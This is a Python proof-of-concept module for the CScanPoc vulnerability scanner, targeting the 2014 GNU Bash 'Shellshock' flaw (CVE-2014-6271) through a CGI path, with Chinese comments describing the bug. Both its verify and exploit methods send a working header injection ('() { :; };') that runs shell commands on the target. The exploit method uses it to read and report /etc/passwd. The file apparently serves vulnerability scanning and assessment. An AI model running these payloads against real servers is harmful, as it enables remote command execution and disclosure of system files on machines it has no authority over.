# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Bash_0001_p'  # 平台漏洞编号，留空
    name = 'GNU Bash远程代码执行漏洞(CNVD-2014-06345)'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.RCE  # 漏洞类型
    disclosure_date = '2014-09-25'  # 漏洞公布时间
    desc = '''
        GNU Bash（Bourne again shell）是一个命令语言解释器，能够从标准输入设备或文件读取、执行命令，结合部分ksh 和csh特点，同时也执行IEEE POSIX Shell（IEEE Working Group 1003.2）规范。 
        GNU Bash 4.3及之前版本存在安全漏洞，可能导致cgi程序在服务器上发送恶意的http请求，允许攻击者利用漏洞执行任意代码。该漏洞产生的原因是bash在完成函数定义后并未退出，而是继续解析并执行shell命令，导致漏洞产生严重后果。
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2014-06345'  # 漏洞来源
    cnvd_id = 'CNVD-2014-06345'  # cnvd漏洞编号
    cve_id = 'CVE-2014-6271'  # cve编号
    product = 'Bash'  # 漏洞应用名称
    product_version = 'Gnu bash 1.14.0-1.14.7，Gnu bash 2.0-2.05，Gnu bash 3.0-3.2.48，Gnu bash 4.0-4.3'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'a05c5846-ca79-461b-a9a9-0ba7df927181'
    author = 'cscan'  # POC编写者
    create_date = '2018-04-20'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            # 需要指定参数，默认/cgi-bin/index.cgi地址
            headers = {
                'User-Agent': "() { :; }; echo; echo; /bin/bash -c 'echo 92933839f1efb2da9a4799753ee8d79c'"}
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            request = requests.get(
                self.target+'/cgi-bin/index.cgi', headers=headers)
            r = request.text
            if '92933839f1efb2da9a4799753ee8d79c' in r:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            headers = {
                'User-Agent': "() { :; }; echo; echo; /bin/bash -c 'cat /etc/passwd'"}
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            request = requests.get(
                self.target + '/cgi-bin/index.cgi', headers=headers)
            r = request.text
            if 'root' in r:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞,读取/etc/passwd文件内容为{passwd}'.format(
                    target=self.target, name=self.vuln.name, passwd=r))
        except Exception as e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
